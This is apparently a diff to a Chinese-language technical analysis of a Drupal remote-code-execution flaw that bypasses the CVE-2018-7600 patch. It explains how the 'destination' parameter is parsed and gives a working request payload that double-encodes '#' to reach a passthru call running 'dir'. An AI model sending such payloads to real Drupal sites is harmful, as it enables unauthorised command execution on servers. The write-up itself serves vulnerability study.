@@ -91,21 +91,27 @@ drupal_process_form($form_id, $form, $form_state);
 可以看到`node_form_delete_submit()`方法从get方法直接接收参数`destination`，与最初分析正常删除文章的参数正是同一个，那么我们就可以利用`destination`传进恶意参数
 
 构造如下
-**`destination=a?q[%2523post_render][]=passthru%26q[%23type]=markup%26q[%23markup]=dir`**
+**`destination=a?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=dir`**
 
-`a`参数是次要的，主要是`q`参数，因为在`includes/common.inc`的`drupal_parse_url()`方法
+注意此处需要转义百分号，对`#`进行二次编码，以绕过`CVE-2018-7600`的补丁，不然在取值时会被认为`q[`是一个值
 
-```php
-if (isset($options['query']['q'])) {
-    $options['path'] = $options['query']['q'];
-    unset($options['query']['q']);
-  }
+原因： 
+`includes/common.inc`的`drupal_parse_url()`方法对url进行了解析，而在url传入到Drupal内部的时候已经经过一层解码，也就是说
 ```
-从q取出值赋给`$options['path']`，也就是a被覆盖了，这个时候的`$options['path']`就是我们传入的数组
+destination=a?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=dir
+```
+在进入Drupal时已经被解码成
+```
+destination=a?q[%23post_render][]=passthru%26q[%23type]=markup%26q[%23markup]=dir
+```
+然后经过`parse_url()`方法对url结构进行解析
 
-注意q的元素需要转义百分号，对`#`进行二次编码，以绕过`CVE-2018-7600`的补丁，不然在取值时会被认为`q[`是一个值
+![parse_url](https://ob5vt1k7f.qnssl.com/1530254681531.png)
+
+`a`参数是次要的，主要是`q`参数，因为在`drupal_parse_url()`下半部分从q取出值赋给`$options['path']`，也就是a被覆盖了，这个时候的`$options['path']`就是我们传入的数组
 
 ![options](https://ob5vt1k7f.qnssl.com/s4o7s)
+
 参数缓存进整个form后通过第二个请求取出，同样经过
 
 ```php
